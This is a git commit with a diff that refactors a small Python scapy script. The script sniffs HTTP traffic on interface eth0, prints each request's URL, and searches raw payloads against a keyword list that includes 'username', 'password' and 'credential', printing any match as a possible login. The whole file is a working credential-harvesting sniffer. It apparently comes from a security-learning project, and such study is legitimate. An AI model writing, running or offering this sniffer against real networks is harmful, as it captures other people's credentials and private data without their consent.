d8b75e2e467c7f7c3407048b4134c852b4da202a
walter v <waltervannoy@yahoo.com>
2025-01-24 20:19:40 -0600

    finish packet sniffer for now, decodes packets to string or from UTF-8

--- packet_sniffer/packet_sniffer.py
+++ packet_sniffer/packet_sniffer.py
@@ -6,16 +6,31 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
-def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords= ["username", "user", "login", "password", "pass", "name", "credential", "usr", "email"]
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        try:
+            # Attempt to decode the Raw payload
+            load = packet[scapy.Raw].load.decode("utf-8")
+            if not load:
+                load = packet[scapy.Raw].load.decode()
+            keywords = ["username", "user", "login", "password", "pass", "name", "credential", "usr", "email"]
             for keyword in keywords:
                 if keyword in load:
-                    print(load)
-                    break
+                    return load
+        except UnicodeDecodeError:
+            # Ignore packets that can't be decoded
+            pass
+    return None
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url.decode())
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
 
 sniff("eth0")
